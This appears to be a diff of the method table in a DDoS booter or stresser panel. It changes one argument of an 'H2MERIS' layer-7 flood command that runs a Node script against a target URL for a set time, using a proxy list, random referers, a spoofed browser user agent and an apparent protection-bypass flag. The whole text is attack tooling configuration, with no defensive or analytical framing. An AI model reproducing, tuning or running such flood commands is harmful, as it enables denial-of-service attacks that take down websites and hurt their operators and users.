@@ -16,7 +16,7 @@ let definitions = {
 let methods = {
     layer7: {
         H2MERIS: {
-            Command: 'cd /root/.flash/ && node h2-meris.js GET {url} {time} 8 64 px.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true',
+            Command: 'cd /root/.flash/ && node h2-meris.js GET {url} {time} 4 64 px.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true',
             Type: 'layer7'
         },
         H2FLASH: {
